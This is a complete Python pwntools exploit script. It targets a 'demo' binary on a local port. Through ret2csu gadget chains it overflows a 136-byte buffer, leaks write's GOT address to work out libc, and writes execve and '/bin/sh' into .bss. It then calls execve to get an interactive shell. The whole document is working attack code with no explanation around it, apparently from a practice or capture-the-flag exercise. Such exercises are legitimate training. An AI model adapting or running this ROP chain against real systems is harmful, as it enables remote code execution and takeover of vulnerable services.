#!/usr/bin/python 
#coding: utf-8
__author__ = "TaQini"
from pwn import *

#context.log_level = 'debug'

# load program
#p = process('./demo')
#addr = '192.168.191.131'
addr = "127.0.0.1"
p = remote(addr,1234)

# get info from ELF
elf = ELF('demo')
libc = ELF('../libc.so.6')
# libc = ELF('ubuntu')
# infomation
bss = elf.symbols['__bss_start']
log.info("bss start at: " + hex(bss))

read_got = elf.symbols['got.read']
log.info("read_got: " + hex(read_got))

write_got = elf.symbols['got.write']
log.info("write_got: " + hex(write_got))

main = elf.symbols['main']
log.info("main @ " + hex(main))

write_libc = libc.symbols['write']
log.info("write@libc: " + hex(write_libc))

#system_libc = libc.symbols['system']
system_libc = libc.symbols['execve']
log.info("system@libc: " + hex(system_libc))

# overflow point
buflen = 136

# gadgets
# 400610:       4c 89 ea                mov    rdx,r13
# 400613:       4c 89 f6                mov    rsi,r14
# 400616:       44 89 ff                mov    edi,r15
# 400619:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
mmmcall = 0x400610
# 40062a:       5b                      pop    rbx
# 40062b:       5d                      pop    rbp
# 40062c:       41 5c                   pop    r12
# 40062e:       41 5d                   pop    r13
# 400630:       41 5e                   pop    r14
# 400632:       41 5f                   pop    r15
# 400634:       c3                      ret    
ppppppr = 0x40062a

p5j = 0x000000000009776f # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rax

# junkcode
padding = 0xdeadbeef

# function1 leak addr of write
# write(1, write_got, 8)   
payload1 = ""
payload1 += "\x00" * buflen
payload1 += p64(ppppppr) 
rbx = 0
rbp = 1
r12 = write_got         # call   QWORD PTR [r12+rbx*8]
r13 = 8                 # mov    rdx,r13
r14 = write_got         # mov    rsi,r14
r15 = 1                 # mov    edi,r15
ret = mmmcall
payload1 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)

ret = main
payload1 += p64(padding) * 7 + p64(ret) # add rsp,0x8 ;pop 6 reg

log.info("recv[1]: " + p.recvuntil('Hello, World\n'))
sleep(1)

# gdb.attach(p)

p.sendline(payload1)
log.info("## write(1, write_got, 8) -------- leak write")

##debug
#p.interactive()
#exit(0)
##debug
# \x00�O#e\x7f\x00\x00Hello, World

data = p.recv(8)
write = u64(data)
log.info("write address: " + hex(write))

log.info("--- Calculating system address ---")
# system - system_libc = write - write_libc
system = write - write_libc + system_libc
log.info("system address: " + hex(system))

##debug
#p.interactive()
#exit(0)
##debug

# function2
# read(0, bss, 16)       # bss: system_addr(8) +  '/bin/sh\0'(8)
payload2 = ""
payload2 += "\x00" * buflen
payload2 += p64(ppppppr)
rbx = 0
rbp = 1
r12 = read_got           # call   QWORD PTR [r12+rbx*8]
r13 = 16                 # mov    rdx,r13
r14 = bss                # mov    rsi,r14
r15 = 0                  # mov    edi,r15
ret = mmmcall
payload2 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)

ret = main
payload2 += p64(padding) * 7 + p64(ret) # add rsp,0x8; pop 6 regs

log.info("recv[2]: " + p.recvuntil('Hello, World\n'))
sleep(2)

# gdb.attach(p)

p.sendline(payload2)
# log.info("##################-payload-2--sended!---biu~")
log.info("### write(0, bss, 16)   -----------")

p.send(p64(system) + '/bin/sh\0')
log.info("[ system_addr, /bin/sh ] written in bss ")

##debug
#p.interactive()
#exit(0)
##debug

# function check
# write(1, bss, 16)
payload1 = ""
payload1 += "\x00" * buflen
payload1 += p64(ppppppr)
rbx = 0
rbp = 1
r12 = write_got         # call   QWORD PTR [r12+rbx*8]
r13 = 16                # mov    rdx,r13
r14 = bss               # mov    rsi,r14
r15 = 1                 # mov    edi,r15
ret = mmmcall
payload1 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)

ret = main
payload1 += p64(padding) * 7 + p64(ret) # add rsp,0x8 ;pop 6 reg

log.info("recv[*]: " + p.recvuntil('Hello, World\n'))
sleep(2)

# gdb.attach(p)

p.sendline(payload1)
log.info("check malicious code in bss: ")

data1 = p.recv(8)
data2 = p.recv(8)
log.info("execve -- " + hex(u64(data1)))
log.info("bin/sh -- " + data2)

##debug
#p.interactive()
#exit(0)
##debug

# function3
# execve('/bin/sh\0',0,0) 
payload3 = ""
payload3 += "\x00" * buflen
payload3 += p64(ppppppr)
rbx = 0
rbp = 1 
r12 = bss                # call   QWORD PTR [r12+rbx*8]
r13 = 0                  # mov    rdx,r13
r14 = 0                  # mov    rsi,r14
r15 = bss+8              # mov    edi,r15
ret = mmmcall
payload3 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)
ret = main               # don't need return
payload3 += p64(padding) * 7 + p64(ret)

log.info("recv[3]: " + p.recvuntil('Hello, World\n'))
sleep(3)

# gdb.attach(p)

p.sendline(payload3)
log.info("## execve('/bin/sh',0,0) completed.")

##debug
#p.interactive()
#exit(0)
##debug

log.info("get shell. ")

p.interactive()


